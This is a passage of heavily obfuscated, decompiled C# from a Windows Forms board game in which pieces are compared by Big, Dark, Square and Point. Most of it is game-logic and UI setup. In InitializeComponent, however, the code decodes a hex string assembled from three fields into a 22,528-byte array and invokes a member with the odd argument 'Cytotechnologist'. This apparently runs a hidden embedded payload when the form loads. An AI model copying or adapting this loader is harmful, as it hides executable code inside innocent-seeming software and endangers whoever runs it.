						num65 = -230273678;
						num66 = -230273678;
					}
					num = num65 ^ ((int)num2 * -1952196636);
					continue;
				}
				case 58u:
				{
					int num61;
					int num62;
					if (mem[num3, 1].Big != mem[num3, 2].Big)
					{
						num61 = -1478813517;
						num62 = -1478813517;
					}
					else
					{
						num61 = -1453136863;
						num62 = -1453136863;
					}
					num = num61 ^ (int)(num2 * 166432278);
					continue;
				}
				case 57u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = (int)(num2 * 1966254205) ^ -553328320;
						continue;
					}
					goto IL_0338;
				case 56u:
				{
					int num47;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = -1556717796;
						num47 = -1556717796;
					}
					else
					{
						num = -2143778440;
						num47 = -2143778440;
					}
					continue;
				}
				case 55u:
				{
					int num48;
					int num49;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num48 = -1151949534;
						num49 = -1151949534;
					}
					else
					{
						num48 = -1196665674;
						num49 = -1196665674;
					}
					num = num48 ^ ((int)num2 * -1709387444);
					continue;
				}
				case 54u:
				{
					int num31;
					int num32;
					if (mem[3, 3] != null)
					{
						num31 = 172997571;
						num32 = 172997571;
					}
					else
					{
						num31 = 1025570536;
						num32 = 1025570536;
					}
					num = num31 ^ (int)(num2 * 1710677140);
					continue;
				}
				case 53u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = (int)((num2 * 1589466723) ^ 0x4327EB2);
						continue;
					}
					goto IL_0121;
				case 52u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -1641619067) ^ 0x78D6BD30;
						continue;
					}
					goto IL_012d;
				case 51u:
					num = ((int)num2 * -174730035) ^ 0x6C0E376E;
					continue;
				case 49u:
				{
					int num20;
					int num21;
					if (mem[1, 1].Square == mem[2, 2].Square)
					{
						num20 = 782449056;
						num21 = 782449056;
					}
					else
					{
						num20 = 874448808;
						num21 = 874448808;
					}
					num = num20 ^ (int)(num2 * 456211218);
					continue;
				}
				case 48u:
					num4 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_005c;
				case 47u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = (int)((num2 * 1650177126) ^ 0x4BC07323);
						continue;
					}
					goto IL_0121;
				case 46u:
				{
					int num11;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = -9676751;
						num11 = -9676751;
					}
					else
					{
						num = -145066161;
						num11 = -145066161;
					}
					continue;
				}
				case 45u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 890424557) ^ 0x5C540309);
						continue;
					}
					goto IL_005b;
				case 44u:
				{
					int num67;
					int num68;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num67 = 2017515301;
						num68 = 2017515301;
					}
					else
					{
						num67 = 37627885;
						num68 = 37627885;
					}
					num = num67 ^ (int)(num2 * 864416762);
					continue;
				}
				case 43u:
				{
					int num58;
					int num59;
					if (flag2)
					{
						num58 = -600333020;
						num59 = -600333020;
					}
					else
					{
						num58 = -64132461;
						num59 = -64132461;
					}
					num = num58 ^ ((int)num2 * -1059693371);
					continue;
				}
				case 42u:
				{
					int num53;
					int num54;
					if (mem[0, 0] == null)
					{
						num53 = 268137644;
						num54 = 268137644;
					}
					else
					{
						num53 = 401261499;
						num54 = 401261499;
					}
					num = num53 ^ (int)(num2 * 1149754866);
					continue;
				}
				case 41u:
				{
					int num45;
					int num46;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num45 = 971153373;
						num46 = 971153373;
					}
					else
					{
						num45 = 974143191;
						num46 = 974143191;
					}
					num = num45 ^ ((int)num2 * -731950232);
					continue;
				}
				case 40u:
				{
					int num40;
					int num41;
					if (mem[num3, 2] != null)
					{
						num40 = -1283641853;
						num41 = -1283641853;
					}
					else
					{
						num40 = -1875005710;
						num41 = -1875005710;
					}
					num = num40 ^ (int)(num2 * 1714488047);
					continue;
				}
				case 39u:
					if (mem[2, num3].Square == mem[3, num3].Square)
					{
						goto IL_0121;
					}
					goto IL_012d;
				case 38u:
				{
					int num33;
					int num34;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num33 = -762414781;
						num34 = -762414781;
					}
					else
					{
						num33 = -972857361;
						num34 = -972857361;
					}
					num = num33 ^ (int)(num2 * 454148195);
					continue;
				}
				case 37u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = ((int)num2 * -484572505) ^ -1115859802;
						continue;
					}
					goto IL_019e;
				case 36u:
					if (mem[num3, 2].Square != mem[num3, 3].Square)
					{
						num = (int)(num2 * 226127644) ^ -1730849328;
						continue;
					}
					goto IL_0121;
				case 35u:
					if (mem[0, num3].Square == mem[1, num3].Square)
					{
						num = -1873848278;
						continue;
					}
					goto IL_012d;
				case 34u:
				{
					int num24;
					int num25;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num24 = 1187238200;
						num25 = 1187238200;
					}
					else
					{
						num24 = 143646747;
						num25 = 143646747;
					}
					num = num24 ^ (int)(num2 * 455263140);
					continue;
				}
				case 33u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = ((int)num2 * -707275720) ^ -1175435703;
						continue;
					}
					goto IL_012d;
				case 32u:
				{
					int num15;
					int num16;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num15 = -1773522350;
						num16 = -1773522350;
					}
					else
					{
						num15 = -422945417;
						num16 = -422945417;
					}
					num = num15 ^ ((int)num2 * -903868181);
					continue;
				}
				case 31u:
				{
					int num12;
					int num13;
					if (mem[num3, 0] == null)
					{
						num12 = 1186602140;
						num13 = 1186602140;
					}
					else
					{
						num12 = 710559405;
						num13 = 710559405;
					}
					num = num12 ^ ((int)num2 * -1046576088);
					continue;
				}
				case 30u:
				{
					int num8;
					int num9;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num8 = -279965419;
						num9 = -279965419;
					}
					else
					{
						num8 = -1731040539;
						num9 = -1731040539;
					}
					num = num8 ^ ((int)num2 * -1568308642);
					continue;
				}
				case 28u:
				{
					int num69;
					int num70;
					if (mem[1, num3].Big == mem[2, num3].Big)
					{
						num69 = -894930584;
						num70 = -894930584;
					}
					else
					{
						num69 = -1181291087;
						num70 = -1181291087;
					}
					num = num69 ^ (int)(num2 * 2076102634);
					continue;
				}
				case 27u:
				{
					int num63;
					int num64;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num63 = 1004349620;
						num64 = 1004349620;
					}
					else
					{
						num63 = 191978953;
						num64 = 191978953;
					}
					num = num63 ^ ((int)num2 * -926281495);
					continue;
				}
				case 26u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = (int)(num2 * 459677733) ^ -1629104927;
						continue;
					}
					goto IL_0338;
				case 25u:
				{
					int num60;
					if (num3 >= 4)
					{
						num = -210908274;
						num60 = -210908274;
					}
					else
					{
						num = -1568579431;
						num60 = -1568579431;
					}
					continue;
				}
				case 24u:
				{
					int num55;
					int num56;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num55 = -1363174055;
						num56 = -1363174055;
					}
					else
					{
						num55 = -512011059;
						num56 = -512011059;
					}
					num = num55 ^ (int)(num2 * 598632376);
					continue;
				}
				case 23u:
					flag = false;
					num3 = 0;
					num = ((int)num2 * -542045985) ^ 0x1CCDFB52;
					continue;
				case 22u:
					flag = true;
					num = (int)((num2 * 1222537928) ^ 0x5251F28A);
					continue;
				case 21u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -1349681243) ^ -1833092529;
						continue;
					}
					goto IL_00db;
				case 20u:
				{
					int num50;
					int num51;
					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num50 = 1587199601;
						num51 = 1587199601;
					}
					else
					{
						num50 = 1112192721;
						num51 = 1112192721;
					}
					num = num50 ^ ((int)num2 * -1465557526);
					continue;
				}
				case 19u:
					num3++;
					num = -362297149;
					continue;
				case 18u:
				{
					int num43;
					int num44;
					if (mem[num3, 1].Dark == mem[num3, 2].Dark)
					{
						num43 = 1002614161;
						num44 = 1002614161;
					}
					else
					{
						num43 = 836820061;
						num44 = 836820061;
					}
					num = num43 ^ (int)(num2 * 1677517928);
					continue;
				}
				case 17u:
				{
					int num42;
					if (mem[num3, 0].Dark == mem[num3, 1].Dark)
					{
						num = -1983662290;
						num42 = -1983662290;
					}
					else
					{
						num = -855679283;
						num42 = -855679283;
					}
					continue;
				}
				case 16u:
				{
					int num38;
					int num39;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num38 = -1574496509;
						num39 = -1574496509;
					}
					else
					{
						num38 = -2067352174;
						num39 = -2067352174;
					}
					num = num38 ^ ((int)num2 * -173501467);
					continue;
				}
				case 15u:
				{
					int num35;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = -876569493;
						num35 = -876569493;
					}
					else
					{
						num = -1987739907;
						num35 = -1987739907;
					}
					continue;
				}
				case 14u:
				{
					int num29;
					int num30;
					if (mem[num3, 3] != null)
					{
						num29 = -2042301967;
						num30 = -2042301967;
					}
					else
					{
						num29 = -1734748719;
						num30 = -1734748719;
					}
					num = num29 ^ ((int)num2 * -931629035);
					continue;
				}
				case 13u:
				{
					int num27;
					int num28;
					if (mem[num3, 1] != null)
					{
						num27 = -1012273367;
						num28 = -1012273367;
					}
					else
					{
						num27 = -889688461;
						num28 = -889688461;
					}
					num = num27 ^ ((int)num2 * -743031609);
					continue;
				}
				case 12u:
					num = -452312372;
					continue;
				case 11u:
				{
					int num26;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = -1452031248;
						num26 = -1452031248;
					}
					else
					{
						num = -1626495605;
						num26 = -1626495605;
					}
					continue;
				}
				case 10u:
				{
					int num22;
					int num23;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num22 = 1349069494;
						num23 = 1349069494;
					}
					else
					{
						num22 = 111074395;
						num23 = 111074395;
					}
					num = num22 ^ (int)(num2 * 139917906);
					continue;
				}
				case 9u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)(num2 * 729824749) ^ -269787929;
						continue;
					}
					goto IL_0338;
				case 8u:
				{
					int num19;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = -2080442105;
						num19 = -2080442105;
					}
					else
					{
						num = -927562346;
						num19 = -927562346;
					}
					continue;
				}
				case 7u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)(num2 * 164451186) ^ -1315051728;
						continue;
					}
					goto IL_0338;
				case 6u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -2024944957) ^ -1123619271;
						continue;
					}
					goto IL_012d;
				case 5u:
					if (mem[0, num3] != null)
					{
						num = -1415065619;
						continue;
					}
					goto IL_012d;
				case 4u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = ((int)num2 * -722052663) ^ -69474659;
						continue;
					}
					goto IL_0121;
				case 3u:
				{
					int num14;
					if (mem[num3, 0].Square == mem[num3, 1].Square)
					{
						num = -917714584;
						num14 = -917714584;
					}
					else
					{
						num = -1484455332;
						num14 = -1484455332;
					}
					continue;
				}
				case 2u:
				{
					int num10;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = -1447838314;
						num10 = -1447838314;
					}
					else
					{
						num = -999540141;
						num10 = -999540141;
					}
					continue;
				}
				case 1u:
				{
					int num5;
					int num6;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num5 = 266449349;
						num6 = 266449349;
					}
					else
					{
						num5 = 192752552;
						num6 = 192752552;
					}
					num = num5 ^ ((int)num2 * -1663009909);
					continue;
				}
				case 0u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = (int)((num2 * 1979499112) ^ 0x3F77DD96);
						continue;
					}
					goto IL_0121;
				case 29u:
					break;
				default:
					{
						return result;
					}
					IL_019e:
					num4 = 1;
					goto IL_005c;
					IL_0121:
					num = -778408675;
					num7 = -778408675;
					continue;
					IL_012d:
					num = -407351166;
					num7 = -407351166;
					continue;
					IL_00db:
					num4 = 0;
					goto IL_005c;
					IL_005b:
					num4 = 0;
					goto IL_005c;
					IL_0338:
					num4 = 1;
					goto IL_005c;
					IL_005c:
					flag2 = (byte)num4 != 0;
					num = -111503062;
					continue;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = default(bool);
		int num6 = default(int);
		int num5 = default(int);
		bool flag3 = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = -1182211661;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF36F1172u) % 16u)
				{
				case 14u:
					flag = num6 < 4;
					num = -1850610334;
					continue;
				case 13u:
					num = ((int)num2 * -1991460565) ^ 0x6DE88932;
					continue;
				case 12u:
					num = ((int)num2 * -914121754) ^ 0x4623AA34;
					continue;
				case 11u:
					num5 = 0;
					num = -74066826;
					continue;
				case 10u:
					flag3 = num5 < 4;
					num = -2076339775;
					continue;
				case 9u:
					result = flag2;
					num = (int)((num2 * 284713118) ^ 0x714856A1);
					continue;
				case 8u:
					flag2 = false;
					num = ((int)num2 * -1681810901) ^ 0x22D58C5D;
					continue;
				case 7u:
					num5++;
					num = -1886207272;
					continue;
				case 5u:
				{
					int num9;
					if (mem[num6, num5] != null)
					{
						num = -2060616875;
						num9 = -2060616875;
					}
					else
					{
						num = -824567702;
						num9 = -824567702;
					}
					continue;
				}
				case 4u:
					num = (int)((num2 * 802183763) ^ 0x6E438A94);
					continue;
				case 3u:
				{
					int num7;
					int num8;
					if (!flag3)
					{
						num7 = 1441163871;
						num8 = 1441163871;
					}
					else
					{
						num7 = 824589608;
						num8 = 824589608;
					}
					num = num7 ^ (int)(num2 * 29018805);
					continue;
				}
				case 2u:
					num6++;
					num = (int)((num2 * 206251106) ^ 0x64EA3598);
					continue;
				case 1u:
					flag2 = true;
					num6 = 0;
					num = ((int)num2 * -1954903499) ^ -2428069;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -1839194935;
						num4 = -1839194935;
					}
					else
					{
						num3 = -538118613;
						num4 = -538118613;
					}
					num = num3 ^ (int)(num2 * 1125585386);
					continue;
				}
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -172750396;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8D039596u) % 11u)
				{
				case 10u:
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)((num2 * 1024461672) ^ 0x6121150B);
					continue;
				case 9u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)((num2 * 936067326) ^ 0x5799C2E0);
					continue;
				case 7u:
					Form1.smethod_32((Control)(object)label6, str);
					num = ((int)num2 * -1964527367) ^ 0x38EE2AB2;
					continue;
				case 6u:
					num = ((int)num2 * -1218832831) ^ 0x43EC1BC7;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1335034020) ^ -1426467463;
					continue;
				case 4u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = (int)(num2 * 845740033) ^ -1690472632;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -1900727727) ^ -230018984;
					continue;
				case 1u:
					num = ((int)num2 * -1246180696) ^ 0x71B17583;
					continue;
				case 0u:
					num = ((int)num2 * -954564743) ^ -1121131287;
					continue;
				default:
					return;
				case 8u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -917955521;
			while (true)
			{
				uint num2;
				int num5;
				switch ((num2 = (uint)num ^ 0xB1639997u) % 9u)
				{
				case 8u:
					num = ((int)num2 * -1079670294) ^ -740353548;
					continue;
				case 7u:
					if (disposing)
					{
						num = (int)((num2 * 1119334461) ^ 0x77C4E039);
						continue;
					}
					num5 = 0;
					goto IL_0028;
				case 6u:
					num = (int)((num2 * 212461962) ^ 0x2977493E);
					continue;
				case 5u:
					((Form)this).Dispose(disposing);
					num = -1034400202;
					continue;
				case 4u:
					num5 = ((components != null) ? 1 : 0);
					goto IL_0028;
				case 2u:
					Form1.smethod_51((IDisposable)components);
					num = ((int)num2 * -304330879) ^ 0x139A6166;
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1702233608;
						num4 = -1702233608;
					}
					else
					{
						num3 = -235861373;
						num4 = -235861373;
					}
					num = num3 ^ ((int)num2 * -1495260315);
					continue;
				}
				default:
					return;
				case 3u:
					break;
				case 1u:
					return;
					IL_0028:
					flag = (byte)num5 != 0;
					num = -260749835;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		bool flag = default(bool);
		int num3 = default(int);
		string string_ = default(string);
		byte[] array = default(byte[]);
		while (true)
		{
			int num = 706028817;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x71C2673Cu) % 127u)
				{
				case 126u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 2030804036) ^ -1174090696;
					continue;
				case 125u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 237294804) ^ 0xD37ED5F);
					continue;
				case 124u:
					num = ((int)num2 * -1667866474) ^ -1205682635;
					continue;
				case 123u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = (int)((num2 * 1238072340) ^ 0x7BAD860F);
					continue;
				case 122u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)((num2 * 1937232626) ^ 0x7CAF0470);
					continue;
				case 121u:
					num = ((int)num2 * -693719799) ^ 0x6B9D677C;
					continue;
				case 120u:
					num = (int)((num2 * 1576818986) ^ 0x4E4197EF);
					continue;
				case 119u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -557677327) ^ 0x7D0888D1;
					continue;
				case 118u:
					Form1.smethod_61((Control)(object)label2, "label2");
					num = (int)(num2 * 1474080601) ^ -1525015694;
					continue;
				case 117u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = ((int)num2 * -1995531540) ^ -205482166;
					continue;
				case 116u:
					num = (int)(num2 * 1179582354) ^ -1396029230;
					continue;
				case 115u:
					flag = num3 < 22528;
					num = 1896815117;
					continue;
				case 114u:
					components = Form1.smethod_52();
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 778989888) ^ 0x2B1893E9);
					continue;
				case 113u:
					num = (int)(num2 * 16228135) ^ -1855733659;
					continue;
				case 112u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 1410586950) ^ 0x5B33BD8E);
					continue;
				case 111u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -2077844275) ^ -1660909530;
					continue;
				case 110u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = ((int)num2 * -258764744) ^ 0x69053FFA;
					continue;
				case 109u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -240072492) ^ 0x56AFFADB;
					continue;
				case 108u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -999425528) ^ 0x2CA1C101;
					continue;
				case 107u:
					num = (int)((num2 * 1327365730) ^ 0x1A6C9027);
					continue;
				case 106u:
					num = ((int)num2 * -2048485947) ^ -703080013;
					continue;
				case 105u:
					num = ((int)num2 * -1791814656) ^ 0x7794E8F3;
					continue;
				case 104u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -105352637) ^ 0x7F01D4AD;
					continue;
				case 103u:
				{
					int num4;
					int num5;
					if (!flag)
					{
						num4 = 551429105;
						num5 = 551429105;
					}
					else
					{
						num4 = 1903353458;
						num5 = 1903353458;
					}
					num = num4 ^ ((int)num2 * -851127690);
					continue;
				}
				case 102u:
					num = ((int)num2 * -177857292) ^ 0x74970827;
					continue;
				case 101u:
					num3 = 0;
					num = (int)((num2 * 337715067) ^ 0x7AC663FB);
					continue;
				case 100u:
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -1338096533) ^ -1712444921;
					continue;
				case 99u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -1472023825) ^ -1149591954;
					continue;
				case 98u:
					Form1.smethod_62(pictureBox1, 0);
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1532694668) ^ 0x75A1C374;
					continue;
				case 97u:
					num = (int)((num2 * 1562375726) ^ 0x62ABC76E);
					continue;
				case 96u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = ((int)num2 * -329331547) ^ -482078113;
					continue;
				case 95u:
					num = (int)(num2 * 524586932) ^ -232122293;
					continue;
				case 94u:
					Form1.smethod_61((Control)(object)label5, "label5");
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -40884251) ^ 0x1190C73D;
					continue;
				case 93u:
					num = ((int)num2 * -1493792510) ^ -658403608;
					continue;
				case 92u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = (int)(num2 * 1252498635) ^ -173678404;
					continue;
				case 91u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = ((int)num2 * -908550486) ^ -809874065;
					continue;
				case 90u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1173193325) ^ -1201503448;
					continue;
				case 89u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = (int)((num2 * 579656892) ^ 0x61ADF577);
					continue;
				case 88u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					label6 = Form1.smethod_57();
					num = ((int)num2 * -1493301040) ^ -1093633020;
					continue;
				case 87u:
					num3++;
					num = (int)(num2 * 525049422) ^ -1500830611;
					continue;
				case 86u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 1619563333) ^ -734763225;
					continue;
				case 85u:
					string_ = Veet.Sa;
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					array = new byte[22528];
					num = (int)(num2 * 239207170) ^ -426889496;
					continue;
				case 84u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1912699208) ^ -1808468136;
					continue;
				case 83u:
					panel1 = Form1.smethod_55();
					num = (int)((num2 * 1286783261) ^ 0xDD72FA0);
					continue;
				case 81u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1584608671) ^ -971306420;
					continue;
				case 80u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 1910451518) ^ 0x186380D6);
					continue;
				case 79u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = ((int)num2 * -1095794037) ^ -78872134;
					continue;
				case 78u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)((num2 * 1960145608) ^ 0x3063D36);
					continue;
				case 77u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -681801630) ^ 0x7DFAF8B6;
					continue;
				case 76u:
				{
					object[] object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					Form1.smethod_70(ComMember, object_);
					num = ((int)num2 * -1516661292) ^ -24918218;
					continue;
				}
				case 75u:
					num = ((int)num2 * -42628733) ^ -1362835148;
					continue;
				case 74u:
					num = ((int)num2 * -219485676) ^ -107537119;
					continue;
				case 73u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = (int)((num2 * 960486433) ^ 0x7EA5770B);
					continue;
				case 72u:
					Form1.smethod_64((Control)(object)panel1, 7);
					num = (int)(num2 * 1289507621) ^ -1307775968;
					continue;
				case 71u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 2075090735) ^ 0x54FBCF57);
					continue;
				case 70u:
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 294841842) ^ -1010696618;
					continue;
				case 69u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -822976488) ^ 0x51E42517;
					continue;
				case 68u:
					num = (int)((num2 * 1984646326) ^ 0x7A9537D1);
					continue;
				case 67u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 390320373) ^ -62675592;
					continue;
				case 66u:
					num = ((int)num2 * -445805121) ^ -1087392241;
					continue;
				case 65u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					Form1.smethod_92((Control)(object)this);
					num = ((int)num2 * -249349242) ^ -1672867133;
					continue;
				case 64u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 119071365) ^ 0x63804F5D);
					continue;
				case 63u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					num = ((int)num2 * -1307255687) ^ 0x3417EB4;
					continue;
				case 62u:
					num = (int)((num2 * 1615029853) ^ 0x48702F7F);
					continue;
				case 61u:
					num = (int)(num2 * 1172988913) ^ -1049732234;
					continue;
				case 60u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)(num2 * 2049741331) ^ -83660555;
					continue;
				case 59u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = (int)(num2 * 646128067) ^ -2060119122;
					continue;
				case 58u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1733155469) ^ -58304967;
					continue;
				case 57u:
					Form1.smethod_64((Control)(object)label2, 9);
					num = (int)((num2 * 1001085243) ^ 0x6E6433BA);
					continue;
				case 56u:
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1825342484) ^ -1968113077;
					continue;
				case 55u:
					num = (int)((num2 * 961005331) ^ 0x15D2E155);
					continue;
				case 54u:
					num = ((int)num2 * -1277948674) ^ 0x1BDA0173;
					continue;
				case 53u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -655751157) ^ 0x68B4E126;
					continue;
				case 52u:
					Form1.smethod_64((Control)(object)label1, 8);
					num = ((int)num2 * -1387698507) ^ 0x4A6D7BA;
					continue;
				case 51u:
					Form1.smethod_72(timer1, 1000);
					num = (int)(num2 * 1894516590) ^ -742849521;
					continue;
				case 50u:
					num = ((int)num2 * -1907205317) ^ 0x61E19610;
					continue;
				case 49u:
					num = ((int)num2 * -1636933613) ^ 0x1CBFD59F;
					continue;
				case 48u:
					num = (int)((num2 * 1037059675) ^ 0x1A3E8C06);
					continue;
				case 47u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -850655921) ^ -5278925;
					continue;
				case 46u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -258891672) ^ -1519918821;
					continue;
				case 45u:
					num = ((int)num2 * -82892482) ^ 0x19529BA5;
					continue;
				case 44u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = (int)(num2 * 992402004) ^ -1052479549;
					continue;
				case 43u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -2058591932) ^ 0x7F4DA67;
					continue;
				case 42u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = (int)((num2 * 1972968572) ^ 0x1C51D6D2);
					continue;
				case 41u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = ((int)num2 * -1446491139) ^ 0x5BBD0C26;
					continue;
				case 40u:
					num = ((int)num2 * -1608002138) ^ 0x5F8AC1D0;
					continue;
				case 39u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -2048206473) ^ 0x43F331B7;
					continue;
				case 38u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 1430354959) ^ -243818530;
					continue;
				case 37u:
					num = (int)((num2 * 1667035014) ^ 0x5402BC41);
					continue;
				case 36u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -1120229059) ^ -1721017258;
					continue;
				case 35u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1507430408) ^ 0x3E6E87A);
					continue;
				case 34u:
					Form1.smethod_74((Control)(object)label1, bool_0: true);
